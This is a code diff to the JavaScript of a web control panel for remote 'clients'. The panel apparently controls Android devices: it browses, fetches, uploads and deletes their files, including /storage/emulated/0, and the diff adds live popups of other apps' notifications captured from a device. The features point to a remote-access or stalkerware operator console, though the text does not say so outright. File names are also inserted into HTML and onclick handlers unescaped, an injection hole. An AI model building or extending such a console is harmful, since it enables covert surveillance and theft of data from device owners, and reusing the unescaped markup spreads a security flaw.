@@ -737,29 +737,41 @@
             }
             else if (currentModal === 'filemanager') {
                 const fm = data.file_manager || { path: '/', files: [] };
-                let html = `<div style="margin-bottom:10px; color:var(--accent-primary)">Path: ${fm.path}</div><table>`;
-                html += `<tr><td colspan="2"><a href="#" onclick="sendCommand('cd ..'); return false;" style="color:var(--accent-secondary); text-decoration:none;">📁 .. (up)</a></td></tr>`;
-                fm.files.forEach(f => {
+                let html = `<div style="margin-bottom:10px; padding:8px; background:#0c1616; border-radius:12px; display:flex; justify-content:space-between; align-items:center;">
+                    <span style="color:var(--accent-primary); word-break:break-all;">📍 ${fm.path}</span>
+                    <button onclick="sendCommand('filemanager')" style="padding:4px 12px; font-size:0.7rem;">REFRESH</button>
+                </div><table>`;
+                
+                // Navigation Up - Only show if not at root
+                if (fm.path !== '/' && fm.path !== '') {
+                    html += `<tr><td colspan="2"><a href="#" onclick="sendCommand('cd ..'); return false;" style="color:var(--accent-secondary); text-decoration:none; display:block; padding:8px 0;">🔙 [parent directory]</a></td></tr>`;
+                }
+
+                // Sort: Folders first, then files
+                const sortedFiles = [...(fm.files || [])].sort((a, b) => (b.isDirectory - a.isDirectory) || a.name.localeCompare(b.name));
+
+                sortedFiles.forEach(f => {
                     const icon = f.isDirectory ? '📁' : '📄';
+                    const color = f.isDirectory ? 'var(--accent-primary)' : 'var(--text)';
                     if (f.isDirectory) {
-                        html += `<tr><td><a href="#" onclick="sendCommand('cd ${f.name}'); return false;" style="color:var(--text); text-decoration:none;">${icon} ${f.name}</a></td>
-                                 <td><button onclick="handleFmAction('delete', '${f.name}')" style="background:none; border:1px solid red; color:red; padding:2px 8px; font-size:0.7rem;">DEL</button></td></tr>`;
+                        html += `<tr><td><a href="#" onclick="sendCommand('cd ${f.name}'); return false;" style="color:${color}; text-decoration:none; display:block; padding:4px 0;">${icon} ${f.name}</a></td>
+                                 <td style="text-align:right;"><button onclick="handleFmAction('delete', '${f.name}')" style="background:none; border:1px solid #ff3b9e; color:#ff3b9e; padding:2px 8px; font-size:0.6rem;">DEL</button></td></tr>`;
                     } else {
-                        html += `<tr><td>${icon} ${f.name}</td>
-                                 <td>
-                                    <button onclick="sendCommand('get ${f.name}')" style="background:none; border:1px solid var(--accent-primary); color:var(--accent-primary); padding:2px 8px; font-size:0.7rem;">GET</button>
-                                    <button onclick="handleFmAction('delete', '${f.name}')" style="background:none; border:1px solid red; color:red; padding:2px 8px; font-size:0.7rem;">DEL</button>
+                        html += `<tr><td><span style="color:${color}">${icon} ${f.name}</span></td>
+                                 <td style="text-align:right;">
+                                    <button onclick="sendCommand('get ${f.name}')" style="background:none; border:1px solid var(--accent-primary); color:var(--accent-primary); padding:2px 8px; font-size:0.6rem;">GET</button>
+                                    <button onclick="handleFmAction('delete', '${f.name}')" style="background:none; border:1px solid #ff3b9e; color:#ff3b9e; padding:2px 8px; font-size:0.6rem;">DEL</button>
                                  </td></tr>`;
                     }
                 });
                 body.innerHTML = html + '</table>';
                 footer.innerHTML = `
-                    <button onclick="document.getElementById('fm-upload').click()">Upload</button>
+                    <button onclick="sendCommand('cd /')">ROOT</button>
+                    <button onclick="sendCommand('cd /storage/emulated/0')">SDCARD</button>
+                    <button onclick="document.getElementById('fm-upload').click()">UPLOAD</button>
                     <input type="file" id="fm-upload" style="display:none" onchange="handleFmAction('upload', this)">
-                    <input placeholder="folder name" id="fm-mkdir-input" style="width:100px">
-                    <button onclick="handleFmAction('mkdir')">Mkdir</button>
-                    <input placeholder="new name" id="fm-input" style="width:100px">
-                    <button onclick="handleFmAction('rename')">Rename</button>
+                    <input placeholder="New Folder" id="fm-mkdir-input" style="width:110px; font-size:0.8rem; height:32px;">
+                    <button onclick="handleFmAction('mkdir')" style="padding:4px 12px;">MKDIR</button>
                 `;
             }
             else if (currentModal === 'notifications') {
@@ -808,6 +820,16 @@
                     clientDataCache[selectedClientId] = cdata;
                     
                     if (currentModal) renderModalContent();
+
+                    // Real-time notifications from notifications list
+                    if (cdata.notifications?.length) {
+                        const latestNotif = cdata.notifications[0];
+                        const notifHash = selectedClientId + latestNotif.packageName + latestNotif.title + latestNotif.text;
+                        if (!notificationHashes.has(notifHash)) {
+                            showPopup('info', `[${latestNotif.packageName}] ${latestNotif.title}: ${latestNotif.text}`);
+                            notificationHashes.add(notifHash);
+                        }
+                    }
 
                     // popup notif
                     if (cdata.agent_messages?.length) {
